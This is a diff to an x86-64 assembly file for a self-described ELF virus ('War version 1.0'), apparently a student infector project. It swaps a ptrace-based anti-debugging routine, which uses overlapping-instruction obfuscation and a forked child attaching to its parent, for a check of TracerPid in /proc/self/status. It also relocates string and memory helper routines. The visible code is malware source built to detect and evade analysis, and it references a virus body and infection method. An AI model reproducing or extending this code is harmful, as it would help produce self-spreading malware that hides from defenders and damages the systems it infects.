@@ -14,7 +14,7 @@ section.text:
 
 ; TODO:
 ; - change trace by checking proc (ex: don t work with gdb peda)
-; - add infection method (PT_NOTE)
+; - define struct instead of var
 ; - better fingerprint
 
 ; -== Optimization ==-
@@ -41,6 +41,9 @@ _start:
 signature db `War version 1.0 (c)oded by lmartin - `; sw4g signature
 fingerprint db `00000000:0000`, 0x0
 
+self_status db `/proc/self/status`, 0x0
+tracer_pid db `TracerPid:\t0\n`, 0x0
+
 _h3ll0w0rld:
 	pop r8; pop addr from stack
 	sub r8, 0x5; sub call instr
@@ -54,78 +57,12 @@ _h3ll0w0rld:
 %endif
 	; Overlapping instruction:
 	; http://infoscience.epfl.ch/record/167546/files/thesis.pdf
-	jmp .here
-	.there:
-	mov rax, 0x00eb58276a525241; push r10; push rdx; push SYSCALL_GETPID; pop rax; jmp $+4
-	syscall
-	jmp $+4
-	mov rdi, 0x00eb5f59616d6168; push PR_SET_PTRACER; pop rdi; jmp $+2
-	push rax
-	jmp $+3
-	mov rsi, 0x009d685e; pop rsi, push SYSCALL_PRCTL
-	db 0x0, 0x0
-	jmp $+4
-	mov rdx, 0x00ebd23148050f58; pop rax; syscall; xor rdx, rdx; jmp $+2
-	push SYSCALL_FORK
+	lea rdi, [rel self_status]
+	xor rsi, rsi; O_RDONLY
+	push SYSCALL_OPEN
 	pop rax
 	syscall
-	jmp $+4
-	.here:
-		jmp .there + 2
 
-	cmp rax, 0x0
-	jne .parent
-
-	.child:
-		jmp $+4
-		mov rax, 0xeb5e50050f586e6a; push SYSCALL_GETPPID; pop rax; syscall; push rax; pop rsi
-		db 0x0; rsi => ppid
-
-		push PTRACE_ATTACH
-		pop rdi
-		push SYSCALL_PTRACE - 41; ptrace - 101; 101 - 41 = 60
-		pop rax
-		jmp $+4
-		syscall
-		add rax, 41; fUn
-		syscall
-
-		cmp rax, 0x0
-		jne .traced
-
-		push rsi
-		pop rdi
-		xor rsi, rsi
-		push SYSCALL_WAIT4; wait4
-		pop rax
-		syscall
-
-		xor rdi, rdi
-		jmp .exit
-		.traced:
-			push 1
-			pop rdi
-
-		.exit:
-			push SYSCALL_EXIT
-			pop rax
-			syscall
-
-	.parent:
-		sub rsp, 8
-		push rax
-		pop rdi
-		lea rsi, [rsp - 8]
-		push SYSCALL_WAIT4
-		pop rax
-		xor r10, r10; rusage
-		syscall
-
-		WEXITSTATUS rax, qword [rsp - 8]
-		add rsp, 8
-
-	pop rdx
-	pop r10
 
 	cmp rax, 0x0
 	jz .sneakyboi - 2; has to jmp on [48 31 c0] -> xor rax, rax
@@ -230,6 +167,86 @@ _exit:
 	pop rax ; exit
 	xor rdi, rdi; = 0
 	syscall
+
+_ft_strlen:; (string rdi)
+	xor rax, rax; = 0
+	.loop_char:
+		cmp byte [rdi + rax], 0
+		jz .return
+		inc rax
+	jmp .loop_char
+	.return:
+ret
+
+_ft_memcmp: ; (void *rdi, void *rsi, size_t rdx)
+	push rcx
+	dec rdx
+
+	xor rax, rax
+	xor rcx, rcx; = 0
+	cmp rcx, rdx
+	je .empty_return
+	.loop_byte:
+		mov al, [rdi + rcx]
+		cmp al, [rsi + rcx]
+		jne .return
+		cmp rcx, rdx
+		je .return
+		inc rcx
+	jmp .loop_byte
+	.return:
+		sub al, [rsi + rcx]
+	.empty_return:
+
+	inc rdx
+	pop rcx
+ret
+
+_ft_memmem: ; (void *rdi, size_t rsi, void *rdx, size_t rcx)
+	push r8
+	push r9
+	push rbx
+
+	xor rax,rax
+	xor r8, r8
+	cmp rsi, rcx
+	jl .return
+	cmp rcx, 0x0
+	je .return
+	.loop_byte:
+		xor rax,rax
+		cmp r8, rsi
+		je .return
+		mov rbx, rdi
+		add rdi, r8
+		push rsi
+		pop r9
+		push rdx
+		pop rsi
+		push rcx
+		pop rdx
+		call _ft_memcmp
+		push rdx
+		pop rcx
+		push rsi
+		pop rdx
+		push r9
+		pop rsi
+		push rbx
+		pop rdi
+		cmp rax, 0x0
+		je .found
+		inc r8
+	jmp .loop_byte
+	.found:
+		mov rax, rdi
+		add rax, r8
+	.return:
+
+	pop rbx
+	pop r9
+	pop r8
+ret
 
 _virus:
 	push rdx
@@ -1165,86 +1182,6 @@ _ft_isnum:; (string rdi) ; 0 no - otherwise rax something else
 	.isnotnum:
 		xor rax, rax
 	.return:
-ret
-
-_ft_strlen:; (string rdi)
-	xor rax, rax; = 0
-	.loop_char:
-		cmp byte [rdi + rax], 0
-		jz .return
-		inc rax
-	jmp .loop_char
-	.return:
-ret
-
-_ft_memcmp: ; (void *rdi, void *rsi, size_t rdx)
-	push rcx
-	dec rdx
-
-	xor rax, rax
-	xor rcx, rcx; = 0
-	cmp rcx, rdx
-	je .empty_return
-	.loop_byte:
-		mov al, [rdi + rcx]
-		cmp al, [rsi + rcx]
-		jne .return
-		cmp rcx, rdx
-		je .return
-		inc rcx
-	jmp .loop_byte
-	.return:
-		sub al, [rsi + rcx]
-	.empty_return:
-
-	inc rdx
-	pop rcx
-ret
-
-_ft_memmem: ; (void *rdi, size_t rsi, void *rdx, size_t rcx)
-	push r8
-	push r9
-	push rbx
-
-	xor rax,rax
-	xor r8, r8
-	cmp rsi, rcx
-	jl .return
-	cmp rcx, 0x0
-	je .return
-	.loop_byte:
-		xor rax,rax
-		cmp r8, rsi
-		je .return
-		mov rbx, rdi
-		add rdi, r8
-		push rsi
-		pop r9
-		push rdx
-		pop rsi
-		push rcx
-		pop rdx
-		call _ft_memcmp
-		push rdx
-		pop rcx
-		push rsi
-		pop rdx
-		push r9
-		pop rsi
-		push rbx
-		pop rdi
-		cmp rax, 0x0
-		je .found
-		inc r8
-	jmp .loop_byte
-	.found:
-		mov rax, rdi
-		add rax, r8
-	.return:
-
-	pop rbx
-	pop r9
-	pop r8
 ret
 
 _ft_strcmp: ; (string rdi, string rsi)
